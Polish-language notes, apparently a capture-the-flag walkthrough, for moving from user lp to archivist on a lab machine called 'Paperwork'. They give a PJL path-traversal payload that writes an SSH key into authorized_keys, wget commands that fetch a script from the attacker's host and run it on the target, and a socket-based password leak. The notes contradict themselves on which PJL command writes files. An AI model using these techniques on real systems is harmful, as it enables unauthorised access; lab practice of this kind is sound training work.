# Jak wejść na **archivist** (z **lp**)

## Dlaczego `cat user.txt` = Permission denied
- Flaga: **`/home/archivist/user.txt`**
- Jesteś **`lp`** — katalog `archivist` to `drwxr-x--- archivist:archivist`.

## Co blokuje `lp`
```text
/run/paperwork/mgmt.sock  → srw-rw---- root:archivist
```
`lp` **nie** jest w grupie `archivist` → **Permission denied** na sockecie (potwierdzone).

## Architektura (skrót)
| Usługa | User | Rola |
|--------|------|------|
| **jetdirect** `:9100` (127.0.0.1) | **archivist** | „Drukarka”, loguje komendy → `commands.log` |
| **paperwork-daemon** | root | Czyta log; przy `FSQUERY`/`FSUPLOAD`/`FSDOWNLOAD` → lockdown + **SCM_RIGHTS** (`admin_pins.conf`) |
| **CorpoSite** `:1337` | root | WWW (nginx proxy) |

## Ścieżka A (standard na tym boxie): **jetdirect :9100**
Jako **lp** masz dostęp do **localhost:9100** (jetdirect działa jako **archivist**).

1. Wyślij komendy **FS*** (plain lub **@PJL FS…**) — muszą wylądować w `commands.log`.
2. Typowy finisz boxów drukarkowych: **`FSUPLOAD`** → zapis pliku w `/home/archivist/printer/` (np. **authorized_keys**, skrypt).
3. Potem: **`ssh archivist@localhost`** albo **`su archivist`** (jeśli masz hasło z `admin_pins`).

**Uwaga (Paperwork):** na **9100** nazwy są **odwrócone** względem intuicji — **`FSUPLOAD` = odczyt** pliku z drukarki, **zapis** idzie przez **`FSAPPEND`** / **`FSDOWNLOAD`** (+ body). Nie używaj `FSUPLOAD` do wrzucenia klucza.

**PJL zapis klucza (FSAPPEND):** `SIZE` w **osobnej linii** po `NAME`, potem dokładnie `N` bajtów klucza w **jednym** `sendall` (bez `recv` między nagłówkiem a body):

```text
@PJL FSUPLOAD NAME="../.ssh/authorized_keys"\r\n
SIZE=91\r\n
<twój ssh-ed25519.pub + \n>
```

Odpowiedź `TIMEOUT` / brak body często = OK. Echo `SIZE=0` = zły nagłówek (nie dawaj `SIZE` w tej samej linii co `NAME`).

Skrypty na Kali:
```bash
python3 -m http.server 8765 --directory ~/Desktop/htb/Paperwork/scripts
python3 scripts/lpd_callback_server.py   # port 8900 dla lpd_post.sh
```

Na target (`lp`):
```bash
wget -qO /tmp/u.py http://<TWOJE_TUN_IP>:8765/jetdirect_upload_ok.py
python3 /tmp/u.py
ssh -o StrictHostKeyChecking=no archivist@127.0.0.1
cat ~/user.txt
```

Z Kali (po uploadzie): `ssh archivist@<TARGET_IP>` z tym samym kluczem co w skrypcie.

## Ścieżka B: **mgmt.sock** + leak hasła admina
1. Najpierw **zatruj** log (jak wyżej) — `FSQUERY` w `commands.log`.
2. Połączenie do `mgmt.sock` musi iść jako użytkownik z grupy **archivist** (nie `lp`).
3. Skrypt `mgmt_leak_admin.py` → `recvmsg` → odczyt `ADMIN_PASSWORD=` z przekazanego fd.
4. Hasłem: logowanie do panelu / **`su archivist`** (zależnie od reszty enum).

## Kolejność w praktyce (Easy)
1. **9100** → dostaniesz **dostęp jako archivist** (upload / klucz / hasło).
2. **`cat ~/user.txt`** jako archivist.
3. Dopiero potem **_laurel** / root** (osobny etap).

Pełny enum: `loot/lpd-callback.log`, daemon: `cat /usr/bin/paperwork-daemon` (world-readable).